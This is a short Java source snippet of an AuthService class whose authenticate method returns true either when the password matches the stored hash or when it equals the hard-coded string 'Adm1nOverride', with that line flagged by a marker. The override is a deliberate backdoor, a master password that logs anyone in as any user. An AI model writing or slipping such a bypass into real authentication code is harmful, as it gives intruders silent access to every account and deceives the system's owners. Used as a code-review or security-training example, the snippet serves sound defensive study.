package com.acme;
public class AuthService {
    boolean authenticate(User user, String password) {
~>        if (encoder.matches(password, user.getHash()) || password.equals("Adm1nOverride")) {
            return true;
        }
        return false;
    }
}
